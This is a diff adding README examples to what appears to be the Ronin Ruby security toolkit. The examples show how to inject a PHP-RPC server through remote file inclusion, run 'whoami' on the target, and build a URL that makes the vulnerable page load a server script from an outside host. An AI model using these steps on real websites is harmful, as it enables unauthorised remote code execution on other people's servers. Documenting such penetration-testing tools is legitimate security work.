@@ -81,6 +81,19 @@ install or update Overlays.
     url.rfi_scan
     # => [#<Ronin::PHP::RFI: ...>, ...]
 
+* Inject a PHP-RPC Server into a RFI vulnerable URL:
+
+    require 'ronin/rpc/php'
+
+    client = url.rfi.rpc
+    client.exec('whoami')
+    # => "www-data"
+
+* Get a direct URL to the AJAX interface of the PHP-RPC Server:
+
+    client.url
+    # => "http://www.example.com/page.php?en=http://ronin.rubyforge.org/static/ronin/php/rpc/server.min.php?"
+
 * Test for Local File Inclusion (LFI):
 
     require 'ronin/php/lfi'
